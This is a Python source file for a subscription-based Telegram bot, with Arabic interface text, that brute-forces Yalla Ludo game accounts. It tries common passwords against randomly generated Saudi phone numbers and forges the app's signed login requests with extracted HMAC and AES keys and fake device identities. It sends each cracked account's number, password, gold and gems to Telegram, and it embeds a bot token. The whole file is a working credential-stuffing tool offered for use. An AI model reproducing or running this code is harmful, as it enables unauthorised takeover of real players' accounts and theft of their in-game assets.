#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# © Q_b_h — Telegram Bot Control Version (Multi-User & Subscriptions)

import base64
import hashlib
import hmac
import html
import json
import os
import random
import signal
import sys
import time
import uuid
import threading
from datetime import datetime, timedelta
import math
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Set

import pyaes
import requests
from requests.adapters import HTTPAdapter
import telebot
from telebot import types

# === إعدادات البوت والمطور ===
TG_TOKEN = "8844579780:AAF8oAN9eRfUK72kZL6e2BQJYYDj_06ZzAg"
ADMIN_ID = 8795120325  # آيدي المطور الوحيد المخول بالتحكم وإدارة الاشتراكات

bot = telebot.TeleBot(TG_TOKEN)

# ملف تخزين الاشتراكات
SUB_FILE = "subscriptions.json"

def load_subscriptions() -> dict:
    if os.path.exists(SUB_FILE):
        try:
            with open(SUB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_subscriptions(subs: dict):
    try:
        with open(SUB_FILE, "w", encoding="utf-8") as f:
            json.dump(subs, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print("خطأ في حفظ الاشتراكات:", e)

def get_subscription_status(user_id: int) -> tuple[bool, str]:
    if user_id == ADMIN_ID:
        return True, "المطور (صلاحيات كاملة ودائمة)"
    
    subs = load_subscriptions()
    str_uid = str(user_id)
    if str_uid not in subs:
        return False, "غير مشترك ❌"
    
    expiry_time = subs[str_uid]
    if time.time() > expiry_time:
        return False, "منتهي الصلاحية ⌛"
    
    remaining_days = math.ceil((expiry_time - time.time()) / 86400)
    return True, f"مفعل ✅ (يتبقى {remaining_days} يوم)"

def add_subscription(user_id: int, days: int):
    subs = load_subscriptions()
    str_uid = str(user_id)
    
    current_time = time.time()
    if str_uid in subs and subs[str_uid] > current_time:
        base_time = subs[str_uid]
    else:
        base_time = current_time
        
    new_expiry = base_time + (days * 86400)
    subs[str_uid] = new_expiry
    save_subscriptions(subs)
    return new_expiry

# === نظام عزل الجلسات والنتائج لكل مستخدم (Per-User Sessions) ===
user_sessions = {}

class UserSession:
    def __init__(self, chat_id: int):
        self.chat_id = chat_id
        self.is_running = False
        self.stop_event = threading.Event()
        self.stats_lock = threading.Lock()
        self.valid_count = 0
        self.wrong_count = 0
        self.error_count = 0
        self.thread = None
        self.tried: Set[str] = set()

def get_user_session(chat_id: int) -> UserSession:
    if chat_id not in user_sessions:
        user_sessions[chat_id] = UserSession(chat_id)
    return user_sessions[chat_id]

# التحقق من ملف التراخيص الخارجي (الخاص بك)
_LIC_URL = "https://raw.githubusercontent.com/replicate88876788/Tesr/refs/heads/main/a.txt"
try:
    _r = requests.get(_LIC_URL, timeout=10)
    _r.raise_for_status()
except requests.RequestException as e:
    print("خطأ في تحميل الملف:", e)
    sys.exit(1)

if "levi1" not in _r.text.strip().splitlines():
    print("❌ صارت اكسباير")
    sys.exit(0)

VER    = "YallaLudo-1.4.9.2-(Build 1040922)-Android 30"
VERH   = "1.4.9.2"
SPRE   = "2.0_2_"
L3     = "L3)qk*@8"
MKEY   = b"4e82797b276c5cb729db62aaa229a057"
MIV    = b"0102030405060708"
K      = "8a9520f016427a54d5de40335bf7e4fe"
K2     = "c889f8f7dc69b1d67e1d3e43cf48f430"
PATH          = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
PROFILE_PATH  = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
SERVER        = "https://httpgateway.lampjkl.com"
TIMEOUT       = 15
HERA_STATIC   = "f580270da66e44438d5ed30fdb08ebba"

PROFILE_SRVS = [
    "https://httpgateway.lampjkl.com",
    "https://httpgateway.planecde.com",
    "https://httpgateway.funcdeg.com",
    "https://httpgateway.carrstuv.com",
    "https://httpgateway.yalla.games",
]

HCONF = [
    {"bizType": 5000, "countryCode": "SA", "hostUrl": "https://api-shumeng.moonlmn.com",    "type": 2, "version": 4},
    {"bizType": 5001, "countryCode": "",   "hostUrl": "ws://firebreak.yalla.games",          "type": 1, "version": 1},
    {"bizType": 5004, "countryCode": "SA", "hostUrl": "https://httpgateway.penabcd.com",     "type": 2, "version": 6},
    {"bizType": 5005, "countryCode": "SA", "hostUrl": "https://api.lightkvd.com",            "type": 2, "version": 4},
    {"bizType": 1000, "countryCode": "SA", "hostUrl": "https://account.lampjkl.com",        "type": 2, "version": 19},
    {"bizType": 1001, "countryCode": "SA", "hostUrl": "https://pay.lampjkl.com",            "type": 2, "version": 17},
    {"bizType": 1002, "countryCode": "SA", "hostUrl": "https://mail.lampjkl.com",           "type": 2, "version": 18},
    {"bizType": 1003, "countryCode": "SA", "hostUrl": "https://clog.lampjkl.com",           "type": 2, "version": 17},
    {"bizType": 1006, "countryCode": "SA", "hostUrl": "https://httpgateway.lampjkl.com",    "type": 2, "version": 20},
    {"bizType": 1007, "countryCode": "SA", "hostUrl": "wss://tyr.lampjkl.com",              "type": 2, "version": 18},
    {"bizType": 1008, "countryCode": "SA", "hostUrl": "wss://hall.lampjkl.com",             "type": 2, "version": 39},
    {"bizType": 2006, "countryCode": "SA", "hostUrl": "https://nitrogen.lampjkl.com",       "type": 2, "version": 19},
    {"bizType": 2007, "countryCode": "SA", "hostUrl": "wss://room.lampjkl.com",             "type": 2, "version": 22},
    {"bizType": 2008, "countryCode": "SA", "hostUrl": "wss://roomgame.lampjkl.com",         "type": 2, "version": 18},
    {"bizType": 3000, "countryCode": "SA", "hostUrl": "https://file.carrstuv.com",          "type": 2, "version": 27},
    {"bizType": 6000, "countryCode": "",   "hostUrl": "https://broadcast-host.ylconfig.com","type": 1, "version": 0},
]

DEVS = [
    ("OnePlus 9 Pro",       "LE2123",    "SA", "SA", 2),
    ("Samsung Galaxy S21",  "SM-G991B",  "AE", "AE", 2),
    ("Xiaomi Mi 11",        "M2011K2G",  "SA", "SA", 2),
    ("Realme GT",           "RMX2202",   "EG", "EG", 2),
    ("Oppo Reno 6",         "CPH2235",   "SA", "SA", 2),
    ("Samsung Galaxy A52",  "SM-A525F",  "SA", "SA", 2),
    ("Huawei P40 Pro",      "ELS-NX9",   "AE", "AE", 2),
    ("OnePlus Nord 2",      "DN2101",    "SA", "SA", 2),
    ("Xiaomi Redmi Note 10","M2101K7AG", "EG", "EG", 2),
    ("Vivo X60 Pro",        "V2046",     "AE", "AE", 2),
    ("Samsung Galaxy A305F","SM-A305F",  "AE", "AE", 2),
    ("ZTE A7030",           "ZTE A7030", "SA", "SA", 2),
]

thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "session"):
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        thread_local.session = session
    return thread_local.session

def gen_hera() -> str:
    return HERA_STATIC

def _aes_cbc(key: bytes, iv: bytes, plaintext: bytes) -> bytes:
    aes = pyaes.AESModeOfOperationCBC(key, iv=iv)
    encrypter = pyaes.Encrypter(aes)
    return encrypter.feed(plaintext) + encrypter.feed()

def _xor_b64(data_str: str, key_str: str) -> str:
    kb = key_str.encode()
    xo = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data_str.encode()))
    return base64.b64encode(xo).decode()

def _gen_shu_meng_id() -> str:
    import secrets
    raw = secrets.token_bytes(28)
    b64 = base64.b64encode(raw).decode()
    return b64.replace("+", "-").replace("/", "_").rstrip("=")[:38]

def _rdev() -> Dict[str, Any]:
    nm, md, pc, sc, dt = random.choice(DEVS)
    brand = nm.split()[0].lower()
    return {
        "deviceId":          str(uuid.uuid4()),
        "deviceName":        f"{brand} {md}",
        "deviceType":        dt,
        "phoneModel":        md,
        "X-Phone-Country":   pc,
        "X-Sim-Country":     sc,
        "downloadChannelId": 1,
        "shuMengId":         _gen_shu_meng_id(),
        "AndroidId":         uuid.uuid4().hex[:32] + "_" + uuid.uuid4().hex[:16],
        "plateType":         0,
        "LanguageId":        2,
        "appType":           0,
    }

def _gen_traceparent() -> str:
    return f"00-{uuid.uuid4().hex + uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-00"

def _build_request(mobile: str, password: str, area_code: int = 966,
                   hconf: List[Dict] = HCONF) -> Dict[str, Any]:
    d   = _rdev()
    now = int(time.time() * 1000)
    nc  = f"{random.randint(0, 2**31 - 1)}_{uuid.uuid4()}"

    bag = {
        "timeSpan":          str(now),
        "version":           VERH,
        "deviceId":          d["deviceId"],
        "deviceName":        d["deviceName"],
        "deviceType":        d["deviceType"],
        "downloadChannelId": d["downloadChannelId"],
        "shuMengId":         d["shuMengId"],
        "nonce":             nc,
        "plateType":         d["plateType"],
        "LanguageId":        d["LanguageId"],
        "phoneModel":        d["phoneModel"],
        "X-Phone-Country":   d["X-Phone-Country"],
        "X-Sim-Country":     d["X-Sim-Country"],
        "AndroidId":         d["AndroidId"],
        "appType":           d["appType"],
    }
    bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()

    sg  = PATH + VER + bb
    sig = hmac.new(K.encode(), sg.encode(), hashlib.sha256).hexdigest()
    xs  = SPRE + sig

    p  = hashlib.md5(sg.encode()).hexdigest()
    mp = f"{p}-{len(sg)}-{K}-{L3}".encode()
    xm = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()

    phex = hashlib.md5(password.encode()).hexdigest().upper()
    body = {
        "mobile":            mobile,
        "areaCode":          area_code,
        "password":          phex,
        "languageId":        d["LanguageId"],
        "nationalityId":     1,
        "hostConfig":        hconf,
        "simCountry":        "",
        "version":           VERH,
        "deviceId":          d["deviceId"],
        "deviceName":        d["deviceName"],
        "deviceType":        d["deviceType"],
        "downloadChannelId": d["downloadChannelId"],
        "shuMengId":         d["shuMengId"],
        "nonce":             nc,
        "plateType":         d["plateType"],
        "phoneModel":        d["phoneModel"],
        "X-Phone-Country":   d["X-Phone-Country"],
        "X-Sim-Country":     d["X-Sim-Country"],
        "AndroidId":         d["AndroidId"],
        "IsSubpackages":     0,
        "appType":           d["appType"],
    }
    bs = json.dumps(body, separators=(",", ":"), ensure_ascii=False).replace("/", "\\/")
    pm = _xor_b64(bs, K)

    ts_stamp = now + random.randint(40, 80)
    ts_time  = ts_stamp + random.randint(30, 60)

    hd = {
        "User-Agent":      VER,
        "UserId":          "0",
        "X-App-Id":        "ludo",
        "X-Baggage":       bb,
        "X-Access-Token":  "",
        "X-Timestamp":     str(ts_stamp),
        "versionString":   VERH,
        "X-Sign":          xs,
        "X-Hera":          gen_hera(),
        "X-Time":          str(ts_time),
        "X-Medusa":        xm,
        "Content-Type":    "application/json; charset=utf-8",
        "Accept-Encoding": "gzip",
        "Connection":      "Keep-Alive",
        "baggage":         "service.name=ludo",
        "traceparent":     _gen_traceparent(),
    }
    return {
        "url":     SERVER + PATH,
        "headers": hd,
        "payload": {"paramJsonString": pm},
        "dev":     d,
        "phex":    phex,
    }

def _post_login_req(path: str, server: str, payload_dict: Dict,
                    token: str, user_id: str, dev: Dict,
                    proxies=None, timeout: int = TIMEOUT) -> Dict:
    session = get_session()
    now      = int(time.time() * 1000)
    nc       = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
    bag_sign = hashlib.md5((K2 + nc).encode()).hexdigest().upper()

    bag = {
        "token":             token,
        "sign":              bag_sign,
        "timeSpan":          str(now),
        "version":           VERH,
        "deviceId":          dev["deviceId"],
        "deviceName":        dev["deviceName"],
        "deviceType":        dev["deviceType"],
        "downloadChannelId": dev["downloadChannelId"],
        "shuMengId":         dev["shuMengId"],
        "nonce":             nc,
        "plateType":         dev["plateType"],
        "LanguageId":        dev["LanguageId"],
        "phoneModel":        dev["phoneModel"],
        "X-Phone-Country":   dev["X-Phone-Country"],
        "X-Sim-Country":     dev["X-Sim-Country"],
        "AndroidId":         dev["AndroidId"],
        "appType":           dev["appType"],
    }
    bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()

    sg  = path + token + VER + bb
    sig = hmac.new(K2.encode(), sg.encode(), hashlib.sha256).hexdigest()
    xs  = SPRE + sig

    p   = hashlib.md5(sg.encode()).hexdigest()
    mp  = f"{p}-{len(sg)}-{K2}-{L3}".encode()
    xm  = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()

    hd = {
        "User-Agent":      VER,
        "UserId":          user_id,
        "X-Baggage":       bb,
        "X-Access-Token":  token,
        "X-Timestamp":     str(now + random.randint(50, 300)),
        "versionString":   VERH,
        "X-Sign":          xs,
        "X-Hera":          gen_hera(),
        "X-Time":          str(now + random.randint(50, 300)),
        "X-Medusa":        xm,
        "Content-Type":    "application/json; charset=utf-8",
        "Accept-Encoding": "gzip",
    }

    bs = json.dumps(payload_dict, separators=(",", ":"), ensure_ascii=False)
    pm = _xor_b64(bs, K2)

    try:
        r = session.post(server + path, json={"paramJsonString": pm}, headers=hd, timeout=timeout, proxies=proxies, verify=True)
        if r.status_code == 403:
            pm2 = _xor_b64(bs, K)
            r = session.post(server + path, json={"paramJsonString": pm2}, headers=hd, timeout=timeout, proxies=proxies, verify=True)
        obj = r.json()
        st  = obj.get("status")
        if st == 0:
            return {"ok": True, "data": obj.get("data") or {}, "raw": obj}
        return {"ok": False, "status": st, "tips": obj.get("tips", ""), "raw": obj, "http": r.status_code}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def fetch_profile(token: str, user_id: str, dev: Dict, login_data: Dict, proxies=None, timeout: int = TIMEOUT) -> Optional[Dict]:
    srvs = []
    for h in (login_data.get("hostConfig") or []):
        if h.get("bizType") == 1006 and h.get("hostUrl"):
            for url in h["hostUrl"].split(","):
                url = url.strip().rstrip("/")
                if url and url not in srvs:
                    srvs.append(url)
            break
    for s in PROFILE_SRVS:
        if s not in srvs:
            srvs.append(s)

    uid_int = int(user_id) if str(user_id).isdigit() else user_id
    payload = {"userId": uid_int}

    for srv in srvs:
        res = _post_login_req(PROFILE_PATH, srv, payload, token, user_id, dev, proxies, timeout)
        if res.get("ok"):
            data = res["data"]
            base = data.get("baseInfo") or data
            if base.get("goldNum") is not None or base.get("diamondNum") is not None:
                return data
        if res.get("http") == 403:
            continue
    return None

def login(mobile: str, password: str, area_code: int = 966, proxies: Optional[Dict] = None, timeout: int = TIMEOUT, server: str = SERVER, fetch_gems: bool = True) -> Dict[str, Any]:
    session = get_session()
    rq = _build_request(mobile, password, area_code)
    rq["url"] = server + PATH
    try:
        r = session.post(rq["url"], json=rq["payload"], headers=rq["headers"], timeout=timeout, verify=True, proxies=proxies)
    except requests.exceptions.RequestException as ex:
        return {"success": False, "error": str(ex), "dev": rq["dev"]}

    try:
        obj = r.json()
    except Exception:
        return {"success": False, "error": f"HTTP {r.status_code} non-JSON", "dev": rq["dev"]}

    if obj.get("status") == 0:
        data   = obj.get("data") or {}
        result = {"success": True, "data": data, "dev": rq["dev"]}
        if fetch_gems:
            token   = data.get("token", "")
            user_id = str(data.get("id", data.get("showNumId", "")))
            if token and user_id:
                prof = fetch_profile(token, user_id, rq["dev"], data, proxies, timeout)
                result["profile"] = prof
        return result

    return {"success": False, "status": obj.get("status"), "tips": obj.get("tips", "خطأ غير معروف"), "raw": obj, "dev": rq["dev"]}

def _tg_text(data: Dict, mobile: str, password: str, profile: Optional[Dict] = None) -> str:
    raw_name = data.get("name") or data.get("nickName", "—")
    name = html.escape(str(raw_name))
    uid  = data.get("showNumId") or data.get("id", "—")
    
    lines = [
        "🎲 <b>Yalla Ludo — HIT FOUND!</b>",
        f"📱 Number : <code>{mobile}</code>",
        f"🔑 Password : <code>{password}</code>",
        f"🆔 ID : <code>{uid}</code>",
        f"👤 Name : {name}"
    ]
    if profile:
        base    = profile.get("baseInfo") or profile
        gold    = base.get("goldNum", "—")
        diamond = base.get("diamondNum", "—")
        level   = base.get("levelId", "—")
        is_vip  = base.get("isVip", False)
        lines += [
            f"💛 ذهب     : {gold}",
            f"💎 جواهر   : {diamond}",
            f"🏆 مستوى   : {level}",
            f"👑 VIP     : {'✅' if is_vip else '❌'}",
        ]
    lines.append("By - @aboodriad")
    return "\n".join(lines)

def generate_saudi_number() -> str:
    prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))

# === دوال تليجرام وأزرار التحكم لكل مستخدم ===

def get_control_keyboard(running: bool, is_admin: bool = False):
    markup = types.InlineKeyboardMarkup()
    if not running:
        markup.add(types.InlineKeyboardButton("▶ بدء الفحص", callback_data="start_check"))
    else:
        markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
    
    if is_admin:
        markup.add(types.InlineKeyboardButton("⚙️ إدارة الاشتراكات", callback_data="admin_subs"))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    is_active, sub_msg = get_subscription_status(user_id)
    is_admin = (user_id == ADMIN_ID)

    if not is_active and not is_admin:
        bot.reply_to(
            message,
            "❌ <b>عذراً، ليس لديك اشتراك فعال في البوت.</b>\n\n"
            f"حالة الاشتراك: {sub_msg}\n"
            "يرجى التواصل مع المطور لتفعيل اشتراكك: @aboodriad",
            parse_mode="HTML"
        )
        return

    text = (
        "🎛 <b>لوحة تحكم فاحص Yalla Ludo</b>\n\n"
        f"👤 حالة اشتراكك: <b>{sub_msg}</b>\n"
        "حالة الفحص الخاص بك: <b>متوقف 🛑</b>\n\n"
        "اضغط على الزر أدناه لبدء عملية الفحص التلقائي الخاصة بك:"
    )
    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_control_keyboard(False, is_admin))

# أوامر المطور لإدارة الاشتراكات عبر الشات
@bot.message_handler(commands=['addsub'])
def cmd_add_subscription(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n<code>/addsub الـآيدي عدد_الأيام</code>", parse_mode="HTML")
        return
    
    try:
        target_id = int(parts[1])
        days = int(parts[2])
        new_expiry = add_subscription(target_id, days)
        expiry_date = datetime.fromtimestamp(new_expiry).strftime('%Y-%m-%d %H:%M:%S')
        bot.reply_to(message, f"✅ تم تفعيل الاشتراك للمستخدم <code>{target_id}</code> لمدة <b>{days} يوم</b>.\n📅 ينتهي في: {expiry_date}", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message, "❌ تأكد من أن الآيدي وعدد الأيام عبارة عن أرقام صحيحة.")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    is_admin = (user_id == ADMIN_ID)
    is_active, _ = get_subscription_status(user_id)

    if not is_active and not is_admin:
        bot.answer_callback_query(call.id, "❌ انتهت صلاحية اشتراكك!", show_alert=True)
        return

    session = get_user_session(chat_id)

    if call.data == "start_check":
        if session.is_running:
            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل لديك بالفعل!")
            return
        
        session.is_running = True
        session.stop_event.clear()
        session.valid_count = 0
        session.wrong_count = 0
        session.error_count = 0

        # بدء خيط الفحص الخاص بهذا المستخدم فقط
        session.thread = threading.Thread(target=run_checker_loop, args=(chat_id, call.message.message_id))
        session.thread.daemon = True
        session.thread.start()

        bot.answer_callback_query(call.id, "✅ تم بدء الفحص بنجاح")
        bot.edit_message_text(
            "🚀 <b>جاري فحص الحسابات في جلستك الخاصة...</b>\n\n"
            f"✅ صيد (Valid): {session.valid_count}\n"
            f"❌ خطأ (Wrong): {session.wrong_count}\n"
            f"⚠️ أخطاء اتصال (Errors): {session.error_count}",
            chat_id=chat_id,
            message_id=call.message.message_id,
            parse_mode="HTML",
            reply_markup=get_control_keyboard(True, is_admin)
        )

    elif call.data == "stop_check":
        if not session.is_running:
            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف مسبقاً لديك!")
            return

        session.is_running = False
        session.stop_event.set()

        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
        
        main_text = (
            "🎛 <b>لوحة تحكم فاحص Yalla Ludo</b>\n\n"
            "حالة الفحص حالياً: <b>متوقف 🛑</b>\n\n"
            f"📊 <b>ملخص نتائج جلستك النهائية:</b>\n"
            f"✅ صيد (Valid): {session.valid_count}\n"
            f"❌ خطأ (Wrong): {session.wrong_count}\n"
            f"⚠️ أخطاء اتصال (Errors): {session.error_count}\n\n"
            "اضغط على الزر أدناه لبدء فحص جديد:"
        )
        bot.edit_message_text(
            main_text,
            chat_id=chat_id,
            message_id=call.message.message_id,
            parse_mode="HTML",
            reply_markup=get_control_keyboard(False, is_admin)
        )

    elif call.data == "admin_subs":
        if not is_admin:
            bot.answer_callback_query(call.id, "❌ مخصص للمطور فقط!", show_alert=True)
            return
        
        subs = load_subscriptions()
        text = "⚙️ <b>قائمة المشتركين الحاليين:</b>\n\n"
        if not subs:
            text += "لا يوجد مشتركين حالياً.\n"
        else:
            for uid, exp in subs.items():
                rem = math.ceil((exp - time.time()) / 86400)
                status_str = f"يتبقى {rem} يوم" if rem > 0 else "منتهي"
                text += f"• <code>{uid}</code> ⟵ {status_str}\n"
        
        text += "\nلإضافة اشتراك استخدم الأمر:\n<code>/addsub [user_id] [days]</code>"
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back_home"))
        
        bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "back_home":
        if not is_active and not is_admin:
            return
        is_active_sub, sub_msg = get_subscription_status(user_id)
        main_text = (
            "🎛 <b>لوحة تحكم فاحص Yalla Ludo</b>\n\n"
            f"👤 حالة اشتراكك: <b>{sub_msg}</b>\n"
            "حالة الفحص الخاص بك: <b>متوقف 🛑</b>\n\n"
            "اضغط على الزر أدناه لبدء عملية الفحص التلقائي الخاصة بك:"
        )
        bot.edit_message_text(main_text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=get_control_keyboard(False, is_admin))

def run_checker_loop(chat_id: int, msg_id: int):
    session = get_user_session(chat_id)
    max_threads = 10
    passwords = ["Aa123123", "Aa123456", "Aa12341234", "Aa12345678"]

    def worker():
        while session.is_running and not session.stop_event.is_set():
            mobile = generate_saudi_number()
            with session.stats_lock:
                if mobile in session.tried:
                    continue
                session.tried.add(mobile)

            password = random.choice(passwords)
            res = login(mobile, password, timeout=TIMEOUT, server=SERVER, fetch_gems=True)

            with session.stats_lock:
                if not session.is_running or session.stop_event.is_set():
                    break
                if res["success"]:
                    session.valid_count += 1
                    prof = res.get("profile")
                    txt = _tg_text(res["data"], mobile, password, profile=prof)
                    try:
                        bot.send_message(chat_id, txt, parse_mode="HTML")
                    except Exception:
                        pass
                else:
                    if "error" in res or res.get("http"):
                        session.error_count += 1
                    else:
                        session.wrong_count += 1

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(worker) for _ in range(max_threads)]
        
        while session.is_running and not session.stop_event.is_set():
            for _ in range(30):
                if not session.is_running or session.stop_event.is_set():
                    break
                time.sleep(0.1)
            
            if not session.is_running or session.stop_event.is_set():
                break
                
            with session.stats_lock:
                status_text = (
                    "🚀 <b>جاري فحص الحسابات في جلستك الخاصة...</b>\n\n"
                    f"✅ صيد (Valid): {session.valid_count}\n"
                    f"❌ خطأ (Wrong): {session.wrong_count}\n"
                    f"⚠️ أخطاء اتصال (Errors): {session.error_count}"
                )
            
            if not session.is_running or session.stop_event.is_set():
                break
                
            try:
                is_admin = (chat_id == ADMIN_ID)
                bot.edit_message_text(
                    status_text,
                    chat_id=chat_id,
                    message_id=msg_id,
                    parse_mode="HTML",
                    reply_markup=get_control_keyboard(True, is_admin)
                )
            except Exception:
                pass

if __name__ == "__main__":
    print("🤖 Bot is running with Subscription System & Isolated User Sessions...")
    bot.infinity_polling()
